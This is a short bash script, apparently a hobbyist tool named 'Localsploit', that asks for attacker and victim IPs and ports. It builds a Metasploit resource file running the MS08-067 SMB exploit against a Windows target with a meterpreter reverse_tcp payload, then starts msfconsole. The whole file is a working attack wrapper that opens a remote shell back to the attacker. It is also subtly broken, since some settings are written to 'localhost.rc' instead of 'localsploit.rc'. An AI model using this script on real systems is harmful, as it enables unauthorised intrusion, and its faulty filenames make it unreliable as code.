apt-get install figlet
clear
figlet Localsploit
echo BY Pratik
echo You need Metasploit to run this tool
echo
read -p "Your IP: " ip
echo 
read -p "Your Port: " port
echo
read -p "Victims IP: " vip
echo 
read -p "Victims Port: " vport
echo
touch locaploit.rc
echo use exploit/windows/smb/ms08_067_netapi >> localsploit.rc
echo set payload windows/meterpreter/reverse_tcp >> localsploit.rc
echo set lhost $ip >> localhost.rc
echo set lport $port >> localhost.rc
echo set rhost $vip >> localsploit.rc
echo set rport $vport >> localhost.rc
echo clear >> localsploit.rc
echo run >> localsploit.rc
msfconsole -r localsploit.rc
